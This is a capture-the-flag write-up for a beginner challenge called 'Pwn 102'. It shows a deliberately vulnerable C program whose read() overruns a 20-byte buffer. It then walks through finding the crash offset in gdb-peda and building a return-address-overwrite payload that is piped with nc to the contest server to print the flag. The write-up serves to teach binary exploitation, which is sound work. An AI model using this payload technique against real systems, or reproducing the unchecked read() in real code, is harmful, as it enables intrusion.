# Writeup [Pwn 102](./README.md)

For every pwn-task it is a good idea to start by checking the security mechanisms in your program. 
I use [gdb-peda](insert link to tips&tricks page here) for debugging and use its tools. 
I open the executable file in gdb-peda by entering `gdb ./pwn102` in the terminal. 
To find the security mechanism, I use **checksec** i gdb-peda:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

The output above tells us that all security mechanisms are turned off. Usually, when all of these are turned off, the task is a normal _buffer overflow_. In this task, that fact was provided, but this is useful information for other pwn tasks.

First, lets take a look the source code (provided in the snippet below) and try to find the vulnerability. There are a couple of things to notice:
* We have a buffer called **name** with room for 20 characters. 
* We have used the read() function to read input data from the terminal, 
which allows the first 64 characters to be read into the program, all other characters will be ignored. 
* There is a function called **supersecret** that use the `system()` function to paste the terminal command `cat flag.txt`. 
Obviously (or maybe not if you haven't seen this before), this command pastes the content of a file called **flag.txt**. 
Oh wait, this function is not used in the program, is it? What if we somehow manipulate the program to run this function?

```C
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void supersecret(void)
{
	system("cat flag.txt");
}

int main(void) 
{
	char name[20];

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("Welcome hackerman!\nPlease enter your secret password to go back in time: ");

	read(STDIN_FILENO, name, 64);

	return 0;
}
```

Alright then, lets check out what the executable does:
```
$ nc pwn102.tghack.no 1062
Welcome hackerman!
Please enter your secret password to go back in time: marito_o_is_awesome
```
The executable accepts our input and simply terminates. But there's a security
issue here, which will help us trick the executable into doing something
else. The issue is that the program will happily read and store up to 64
characters, but only has reserved space for 20 characters. This overflowing of characters
is the buffer overflow vulnerability. Or even more specific, this is a stack overflow
vulnerability. We don't need a debugger to take advantage of this, but let's open 
gdb-peda and see what we can do.

> TIP: It is normal to use the capital letter `A` as input, to easily find it in the stack later. 
We may recognize the letter by its hexadecimal representation, `40`, in the debugger. 
Sometimes it comes in handy to use `B` as well, which has the hexadecimal representation of `42`. 
You should keep in mind that `0a` is the hex code for line break, meaning when you press the enter-button.

Now, open the executable in gdb-peda, and insert lots of A's, 
in order to find out exactly where in the program it crashes. 
You may run the executable with input by entering `r <<< [your input here]` into the debugger. 
I use python to insert thirty A's into the debugger:
```
gdb-peda$ r <<< `python2 -c 'print "A"*30'`
```

With thirty characters, everything seems to run just fine. After trying a bit, 
we figure out that the program exits normally when having a 31 character input. 
However, using a 32 characters input makes the program fail by a `Segmentation Fault`, 
or commonly called a `segfault`. The debugger outputs `Stopped reason: SIGSEGV` to 
tell that the program segfaulted, and the memory address which caused the program to segfault, 
as the snippet below presents. We can also see that 
our input characters have overwritten three bytes of the return address (two A's and 
a newline). In the snippet, we used 34 characters. 
We know that the memory address in the snippet below is the return address of the program. 
We know that because every function has a return address, 
and there are no functions called except the `main()` function which starts the program.
A method to check that it really is the return address that is overwritten, 
is to make the code stop at the last instruction of the `main()` function in gdb-peda.
The program will stop at this instruction when running the program, and the memory address is shown in gdb-peda. 
The code may be stopped by putting entering a breakpoint. See the help at our [tips&tricks page](insert link to tips&tricks page here).

```
Stopped reason: SIGSEGV
0xf70a4141 in ?? ()
gdb-peda$ 
```

> TIP: To see what will end up as the return address, you can set a breakpoint at the return address of the main function. 
Whenever you run the program, it stops at the breakpoint, 
and gdb-peda shows the new return address at the top of the stack (see the top of the snippet below). 
The command for entering a breakpoint is `gdb-peda$ b *0x08048559`. 
Find the return address by disassembling the function with `gdb-peda$ disas main`. 
You have to look for the assembly instructon `ret` in the bottom of the disassembly 
of the main function and the memory address to the left of it is the address to put a breakpoint on. 
When your program stops at a breakpoint, you may continue running the program by writing `gdb-peda$ c`.

```
[------------------------------------stack-------------------------------------]
0000| 0xffffd0dc --> 0xf70a4141 
0004| 0xffffd0e0 --> 0x1 
0008| 0xffffd0e4 --> 0xffffd174 --> 0xffffd33a ("/some/path/to/your/executable/pwn102")
0012| 0xffffd0e8 --> 0xffffd17c --> 0xffffd370 ("SOMESTUFFHERE/something/stuff")
0016| 0xffffd0ec --> 0x0 
0020| 0xffffd0f0 --> 0x0 
0024| 0xffffd0f4 --> 0x0  
0028| 0xffffd0f8 --> 0xf7fb2000 --> 0x1afdb0 
[------------------------------------------------------------------------------]
```

As we know where the program segfaults, we should overwrite the return address. 
Lets put some B's in there as well, in order to find out exactly which four bytes 
that will overwrite the return address of the main function. 
This is a matter of trying and failing and then ending up with the following snippet. 
```
gdb-peda$ r <<< `python2 -c 'print "A"*32 + "BBBB"'`
```
```
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 

```
Now we see that the return address contains our four B's (because the hex representation of B is 42). 
The magic now is that we know exactly where to put the memory address to our **supersecret** function, 
it should overwrite the return address we just overwrote with the B's. 
But we need to find the memory address to the supersecret function which we want to manipulate the program to run. 
As we know the name of the function, its easy peasy to find it in gdb-peda by either of these commands:
* `gdb-peda$ p supersecret`
* `gdb-peda$ disas supersecret`, in which you choose the first memory address in the disassembled code.

Both returns this memory address: `0x080484b0`.

Alright, we're almost finished! Let's replace the B's that was placed exactly over the return address with the hex representation of the memory address to the supersecret function:
```
gdb-peda$ r <<< `python -c 'print "A"*32 + "\xb0\x84\x04\x08"'`
```
> NOTE: We have to write the address backwards because of the usage of little endian. 
Endiannes refers to the order in which all bytes are stored in memory. 
Little endian means that all the bytes are stored in the reversed order. 
You may read more about endiannes in [this Wikipedia page](https://en.wikipedia.org/wiki/Endianness).

Which gives us the flag, or the dummy-flag in the flag.txt file you made, as you are debugging now: 
```
gdb-peda$ r <<< `python -c 'print "A"*32 + "\xb0\x84\x04\x08"'`
Starting program: /some/path/to/pwn102 <<< `python -c 'print "A"*32 + "\xb0\x84\x04\x08"'`
Welcome hackerman!
Please enter your secret password to go back in time: [New process 26892]
process 26892 is executing new program: /bin/dash
[New process 26893]
process 26893 is executing new program: /bin/cat
TG18{Dummy flag for debugging purposes}
[Inferior 3 (process 26893) exited normally]
```

NOW! This should be it, lets test our exploit by piping it to the server. This needs a few changes to work with bash.
```
$ python -c 'print "A"*32 + "\xb0\x84\x04\x08"' | nc pwn102.tghack.no 1062
Welcome hackerman!
Please enter your secret password to go back in time: TG18{n0w_u_kn0w_basic_pwning}
``` 
Hellz yeah! We did it!

**Fact:** Buffer overflows was publicly documented as early as in 1972. 
It is not as big a threat anymore. Stack buffer overflow, also called stack overflow, 
is the type of buffer overflow we have exploited in this task. 
Stack overflow is no longer a major threat, and most systems have protection against this vulnerability nowadays.

Do you want to read more about buffer overflows? [Read this.](https://en.wikipedia.org/wiki/Buffer_overflow)
